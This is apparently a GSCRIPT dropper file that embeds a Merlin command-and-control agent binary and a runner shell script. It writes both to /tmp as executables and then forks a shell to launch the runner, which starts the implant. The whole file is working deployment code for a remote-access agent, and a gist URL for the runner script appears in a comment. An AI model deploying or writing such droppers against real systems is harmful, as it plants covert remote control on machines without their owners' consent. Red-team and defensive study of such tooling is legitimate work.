// genesis script

//import:/private/tmp/merlinagent.elf
//import:/private/tmp/merlin_nix_runner.sh
//https://gist.githubusercontent.com/ahhh/cc5f988c0a45db58dd731b5f0eb5f23c/raw/794d2c74832018733815e772eb56f3c11de3e6c5/merlin_nix_runner.sh

var fn2;
var fn;

function BeforeDeploy() {
  hello_world = "testing merlin linux";
  return true; 
}

function Deploy() {
  var merlin = Asset("merlinagent.elf");
  fn = "/tmp/merlinagent";
  WriteFile(fn, merlin.fileData, 0755);

  var script = Asset("merlin_nix_runner.sh");
  fn2 = "/tmp/runner.sh";
  WriteFile(fn2, script.fileData, 0755);
  return true;
}

function AfterDeploy() {
  ForkExecuteCommand("/bin/sh", [fn2]);
  return true;
}
